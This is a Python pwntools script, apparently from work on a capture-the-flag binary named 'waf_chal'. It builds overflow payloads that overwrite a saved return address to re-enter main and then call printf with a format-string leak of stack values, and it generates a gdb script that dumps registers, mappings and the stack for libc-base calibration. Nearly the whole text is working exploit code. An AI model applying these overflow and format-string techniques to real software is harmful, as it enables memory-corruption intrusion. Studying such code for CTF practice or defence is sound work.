from pwn import *
context.arch='amd64'; context.log_level='error'
e=ELF("/work/waf_chal/chal_patched")
libc=ELF("/work/waf_chal/libc.so.6")
PRINTF=e.plt['printf']; MAIN=e.symbols['main']
def build(fmt, ret):
    body=(b"exit"+fmt).ljust(0x58,b"A"); assert b"\x00" not in body
    return body+p64(ret)

# Use gdb to get libc base, then leak args, compute offsets.
import subprocess, re, os
# Run under gdb: prime 3, break at printf (2nd... our call), print vmmap libc base + args
gdbscript = r'''
set pagination off
set logging file /work/waf_leakcal_log.txt
set logging overwrite on
set logging enabled on
python
import gdb
hits=0
def stop_handler(ev):
    pass
gdb.execute("break *0x4010d4")
gdb.execute("run < /work/waf_leak_in.bin")
# first hit: printf(">> ") of round0. We primed 3 rounds -> many printf(">> ") hits.
# Just continue a fixed number so we land on OUR printf(buf). Our printf is the 4th program-printf
# (rounds: each main loop prints ">> " once via printf; plus our final printf(buf)).
# Simpler: continue until rdi points to a buffer starting with 'exit'
import re
for _ in range(60):
    rdi=int(gdb.parse_and_eval("$rdi"))
    try:
        s=gdb.selected_inferior().read_memory(rdi,4).tobytes()
    except:
        s=b""
    if s==b"exit":
        break
    gdb.execute("continue")
gdb.execute('printf "RDI=%p\\n", $rdi')
gdb.execute('printf "RSP=%p\\n", $rsp')
# libc base
m=gdb.execute("info proc mappings", to_string=True)
open("/work/waf_maps.txt","w").write(m)
# dump 40 stack qwords
gdb.execute("x/40gx $rsp")
end
quit
'''
open("/work/waf_leakcal.gdb","w").write(gdbscript)
# input: prime 3 (MAIN) then 1 printf leak with markers
data=b""
for i in range(3):
    data+=build(b"", MAIN)+b""  # note: read reads 0x80 per round; but our sends are one blob -> ok? 
# The program reads 0x80 each __gets; feeding a concatenated blob works if each read consumes exactly our chunk.
# Each build() is <=96 bytes; read(0x80) reads up to 128 but returns available. Risk: one read grabs two chunks.
# To be safe, pad each chunk to exactly 0x80 with newlines? read returns what's available in the pipe at once.
# We'll instead rely on interactive timing in the real exploit; for calibration use gdb 'run <file' which
# provides all bytes at once -> read may grab >1 chunk. So pad each chunk to 0x80 EXACTLY.
data=b""
for i in range(3):
    b=build(b"", MAIN)
    b=b.ljust(0x80, b"\xff")   # pad to 128 so each read consumes exactly 128 (but ljust adds 0xff after ret -> after nulls; WAF already fired at ret null, fine)
    data+=b
lk=build(b"L%6$p.%12$p.%18$p.%19$p.%20$p.%21$p.%22$p.", PRINTF).ljust(0x80,b"\xff")
data+=lk
open("/work/waf_leak_in.bin","wb").write(data)
print("input built", len(data))
